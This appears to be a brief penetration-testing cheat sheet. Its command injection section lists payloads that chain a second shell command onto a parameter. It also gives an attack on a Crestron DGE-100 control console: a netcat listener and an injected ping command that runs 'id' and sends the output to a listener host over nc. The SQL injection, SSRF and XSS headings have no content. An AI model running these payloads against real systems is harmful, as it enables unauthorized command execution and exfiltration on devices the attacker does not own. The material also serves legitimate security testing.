## Command Injection
### Examples to find command injection vulnerability
	-h
	PARAM; echo Injected 
	echo Injected|
	PARAM | echo Injected 
	PARAM || echo Injected 
	PARAM & echo Injected 
	PARAM && echo Injected
	$(echo Injected)
	\`echo Injected\`
	>(Echo Injected)
	Josh;id #

### Creston DGE-100 attack against DGE-100 Control Console 
nc -nlvp 8080
nc 10.10.10.1 41795 
ping $(echo "$(id)" | /system/xbin/nc 192.168.1.1 8080) 

## SQL injection

## SSRF and IMDS

## XSS 